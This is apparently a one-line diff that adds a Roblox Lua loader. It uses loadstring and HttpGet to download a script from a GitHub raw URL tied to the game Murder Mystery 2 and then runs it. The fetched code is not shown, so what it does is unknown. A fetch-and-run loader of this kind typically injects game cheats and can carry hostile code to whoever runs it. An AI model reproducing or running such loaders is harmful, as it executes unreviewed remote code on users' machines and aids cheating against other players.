@@ -1,0 +1,1 @@
+loadstring(game:HttpGet("https://raw.githubusercontent.com/nikita1055/MURDER--mystery-2/bbd6dfb783a9259adeddb70cbc96e2250b7bc014/Good-mm2", true))()
